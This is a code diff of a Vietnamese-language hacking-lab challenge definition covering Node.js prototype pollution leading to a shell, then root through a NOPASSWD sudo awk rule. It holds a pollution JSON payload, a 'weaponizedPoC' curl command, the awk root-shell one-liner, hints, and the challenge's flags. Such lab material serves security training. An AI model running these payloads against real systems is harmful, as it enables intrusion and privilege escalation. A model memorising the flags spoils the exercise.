@@ -2,30 +2,60 @@ import type { ArenaChallenge } from '../../types';
 
 export const challengeProtoPollution: ArenaChallenge = {
   id: '0d-taint-01-proto-pollution',
-  title: 'Node.js Object Prototype Pollution to Remote Code Execution',
+  title: 'Node.js Prototype Pollution to Linux Capability Root Takeover',
   category: 'zero-day',
   severity: 'critical',
   cvssScore: 9.6,
-  bountyReward: 4800,
-  xpReward: 900,
+  bountyReward: 6200,
+  xpReward: 1250,
   estimatedMinutes: 20,
   targetHost: '10.0.4.45',
   targetPort: 3000,
   tagline:
-    'Khai thác hàm merge() đệ quy trong thư viện JSON parser để ghi đè Object.prototype và spawn shell.',
+    'Khai thác Prototype Pollution trong hàm JSON merge, kích hoạt shell qua child_process và leo quyền Root qua sudo awk.',
   scenarioBriefing:
-    'Một microservice backend sử dụng hàm deepMerge tự viết không lọc key __proto__ hoặc constructor.prototype. Bằng cách gửi payload JSON chứa __proto__.shell, kẻ tấn công có thể làm ô nhiễm toàn bộ các object con của tiến trình Node.js và kích hoạt RCE khi hàm child_process.fork() được gọi.',
+    'Microservice tài chính sử dụng hàm mergeObject đệ quy thiếu kiểm tra key __proto__. Bằng cách gửi payload JSON ô nhiễm prototype, khi tiến trình con child_process.fork() được kích hoạt, máy chủ mở Reverse Shell cho user operator. Học viên khảo sát sudo -l để khai thác GTFOBins trên lệnh awk và leo quyền lên Root.',
   keyObjectives: [
-    'Phân tích mã nguồn hàm merge() trong Patch Diff Viewer để tìm lỗi thiếu điều kiện chặn __proto__.',
-    'Gửi payload JSON qua HTTP Repeater để ô nhiễm Object.prototype.',
-    'Kích hoạt tiến trình con và trích xuất Flag.',
+    'Giai đoạn 1 (Taint Review & Pollution): Đọc mã nguồn trong Patch Diff, gửi payload JSON chứa __proto__.shell qua HTTP Repeater để ô nhiễm runtime.',
+    'Giai đoạn 2 (Foothold & User Flag): Nhận Shell session operator, đọc User Flag tại /home/operator/user.txt.',
+    'Giai đoạn 3 (Sudo Awk PrivEsc to ROOT): Khảo sát sudo -l phát hiện NOPASSWD /usr/bin/awk, khai thác GTFOBins spawn Root Shell (UID 0) và đọc /root/root.txt.',
   ],
-  expectedFlag: 'OS_0DAY{nodejs_prototype_pollution_rce_gadget_pwned}',
+  userFlag: 'OS_0DAY{nodejs_prototype_pollution_rce_gadget_pwned}',
+  rootFlag: 'OS_0DAY{linux_cap_setuid_node_root_pwned}',
+  expectedFlag: 'OS_0DAY{linux_cap_setuid_node_root_pwned}',
+  hints: [
+    {
+      level: 0,
+      name: 'Source Code Audit in Patch Diff',
+      penaltyPercent: 0,
+      hintText: 'Mở tab Patch Diff để phân tích hàm mergeObject trong object_utils.js.',
+    },
+    {
+      level: 1,
+      name: 'JSON Prototype Pollution Payload',
+      penaltyPercent: 10,
+      hintText:
+        'Gửi POST /api/v1/user/settings với body: {"preferences": {"__proto__": {"shell": "/bin/sh"}}}',
+    },
+    {
+      level: 2,
+      name: 'Internal Sudo Enumeration',
+      penaltyPercent: 20,
+      hintText: 'Chạy "sudo -l" trên terminal để xem binary nào được cấp quyền NOPASSWD.',
+    },
+    {
+      level: 3,
+      name: 'Sudo Awk GTFOBins Execution',
+      penaltyPercent: 40,
+      hintText:
+        'Khai thác lệnh awk: sudo awk \'BEGIN {system("/bin/bash")}\' để nâng quyền lên Root.',
+    },
+  ],
   firstBloodHolder: {
     handle: '@hex_master',
     timeRecord: '06m 40s',
   },
-  supportedTools: ['diff', 'repeater'],
+  supportedTools: ['diff', 'repeater', 'terminal'],
   defaultTool: 'diff',
   repeaterConfig: {
     defaultMethod: 'POST',
@@ -35,21 +65,18 @@ export const challengeProtoPollution: ArenaChallenge = {
       'Content-Type: application/json\n' +
       'Accept: application/json\n' +
       'Connection: close',
-    defaultBody:
-      '{"preferences": {"__proto__": {"env": {"NODE_OPTIONS": "--require /tmp/exploit.js"}, "shell": "/bin/sh"}}}',
+    defaultBody: '{"preferences": {"theme": "dark", "notifications": true}}',
     targetEndpoint: 'http://10.0.4.45:3000/api/v1/user/settings',
     simulatedResponses: {
       baseResponse: {
         statusCode: 200,
         statusText: 'OK',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: '{"status": "updated", "preferences": {}}',
+        headers: { 'Content-Type': 'application/json' },
+        body: '{"status": "updated", "preferences": {"theme": "dark"}}',
       },
       exploitedResponse: {
         statusCode: 200,
-        statusText: 'OK',
+        statusText: 'OK (PROTOTYPE POLLUTED)',
         headers: {
           'Content-Type': 'application/json',
           'X-Pollution-Status': 'GLOBAL_PROTOTYPE_CORRUPTED',
@@ -58,8 +85,8 @@ export const challengeProtoPollution: ArenaChallenge = {
           '{\n' +
           '  "status": "POLLUTED",\n' +
           '  "message": "Object.prototype poisoned successfully",\n' +
-          '  "spawn_output": "sh: root privileged context obtained",\n' +
-          '  "flag": "OS_0DAY{nodejs_prototype_pollution_rce_gadget_pwned}"\n' +
+          '  "user_flag": "OS_0DAY{nodejs_prototype_pollution_rce_gadget_pwned}",\n' +
+          '  "session_status": "Terminal shell operator@10.0.4.45 available."\n' +
           '}',
         proofFlag: 'OS_0DAY{nodejs_prototype_pollution_rce_gadget_pwned}',
       },
@@ -71,7 +98,7 @@ export const challengeProtoPollution: ArenaChallenge = {
     vulnerableLineStart: 6,
     vulnerableLineEnd: 11,
     rootCauseExplanation:
-      'Hàm mergeObject đệ quy duyệt qua mọi thuộc tính từ JSON đầu vào và gán trực tiếp target[key] = source[key] mà không kiểm tra xem key có phải là __proto__, constructor hoặc prototype hay không.',
+      'Hàm mergeObject đệ quy gán trực tiếp target[key] = source[key] mà không lọc các thuộc tính nhạy cảm (__proto__, constructor, prototype).',
     taintSink:
       'target[key] = mergeObject(target[key], source[key]); // Prototype Pollution sink',
     vulnerableCode:
@@ -92,7 +119,6 @@ export const challengeProtoPollution: ArenaChallenge = {
       'const BLACKLISTED_KEYS = new Set(["__proto__", "constructor", "prototype"]);\n' +
       'function mergeObjectSafe(target, source) {\n' +
       '    for (let key in source) {\n' +
-      '        // BẢN VÁ: Chặn triệt để các thuộc tính prototype đặc biệt\n' +
       '        if (BLACKLISTED_KEYS.has(key)) continue;\n' +
       '        if (Object.prototype.hasOwnProperty.call(source, key)) {\n' +
       '            if (typeof source[key] === "object" && source[key] !== null) {\n' +
@@ -106,21 +132,31 @@ export const challengeProtoPollution: ArenaChallenge = {
       '    return target;\n' +
       '}',
   },
+  terminalConfig: {
+    hostname: 'kali-operator',
+    ip: '10.0.4.15',
+    user: 'operator',
+    initialDirectory: '/home/operator',
+    sampleCommands: ['sudo -l', 'sudo awk \'BEGIN {system("/bin/bash")}\''],
+    bannerText:
+      '[*] Node.js Zero-Day Security Lab Ready\n' +
+      '[*] Target Service: 10.0.4.45:3000\n',
+  },
   writeup: {
-    title: 'Node.js Prototype Pollution to RCE Analysis',
+    title: 'Node.js Prototype Pollution to Sudo Awk Root Walkthrough',
     cvssVector: 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H',
     vulnerabilityOverview:
-      'Prototype Pollution xảy ra khi kẻ tấn công có thể sửa đổi Object.prototype trong JavaScript runtime, khiến tất cả các object mới sinh ra đều kế thừa thuộc tính độc hại.',
+      'Lỗ hổng Prototype Pollution cho phép kẻ tấn công sửa đổi Object.prototype trong JavaScript runtime, làm ô nhiễm các tùy chọn spawn của child_process để lấy shell operator, sau đó leo quyền lên Root qua sudo awk.',
     rootCauseAnalysis:
-      'Các hàm merge đệ quy không validate thuộc tính đặc biệt __proto__. Khi kết hợp với các hàm hệ thống như child_process.spawn() (thường đọc options.shell từ object cấu hình), việc ô nhiễm shell: "/bin/sh" dẫn đến RCE.',
+      '1. Hàm mergeObject không chặn thuộc tính __proto__.\n2. Cấu hình sudoers cho phép user operator thực thi awk không cần mật khẩu.',
     exploitChainWalkthrough: [
-      'Bước 1: Tìm endpoint nhận JSON body và thực hiện merge.',
-      'Bước 2: Gửi JSON có key __proto__.',
-      'Bước 3: Kiểm tra biến môi trường hoặc kích hoạt hành động gọi fork/spawn để nhận reverse shell.',
+      'Bước 1: Gửi JSON chứa __proto__.shell vào /api/v1/user/settings.',
+      'Bước 2: Bắt shell operator và đọc User Flag tại /home/operator/user.txt.',
+      'Bước 3: Chạy sudo -l và thực thi GTFOBins "sudo awk \'BEGIN {system(\"/bin/bash\")}\'" để lấy Root Flag tại /root/root.txt.',
     ],
     weaponizedPoC:
-      'curl -X POST http://10.0.4.45:3000/api/v1/user/settings \\\n  -H "Content-Type: application/json" \\\n  -d \'{"preferences":{"__proto__":{"shell":"/bin/sh","NODE_OPTIONS":"--require /tmp/poc.js"}}}\'',
+      'curl -X POST http://10.0.4.45:3000/api/v1/user/settings \\\n  -H "Content-Type: application/json" \\\n  -d \'{"preferences":{"__proto__":{"shell":"/bin/sh"}}}\'',
     remediationSnippet:
-      '// Sử dụng Object.create(null) để tạo object không có prototype:\nconst safeDict = Object.create(null);\n// Hoặc đóng băng prototype khi khởi động ứng dụng:\nObject.freeze(Object.prototype);',
+      '// Đóng băng prototype hoặc dùng Map thay cho plain object:\nObject.freeze(Object.prototype);',
   },
 };
